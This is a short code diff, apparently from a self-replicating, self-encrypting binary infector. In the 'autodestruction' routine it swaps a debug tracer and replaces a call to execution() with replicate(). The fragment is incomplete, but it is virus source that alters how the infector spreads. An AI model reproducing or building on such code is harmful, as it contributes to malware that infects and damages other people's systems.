@@ -9,7 +9,7 @@ void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_co
 //	decrypt_left(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
 
 #if DEBUG
-	EXIT_TRACER("autodestruction:\t");
+	MID_TRACER("autodestruction:\t");
 #endif
 
 	char *entry;
@@ -27,5 +27,5 @@ void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_co
 	keychain->key[LEFT] = 0xdead;
 	keychain->key[RIGHT] = 0xbeef;
 
-	execution(host, keychain, context);
+	replicate(host, keychain, context);
 }
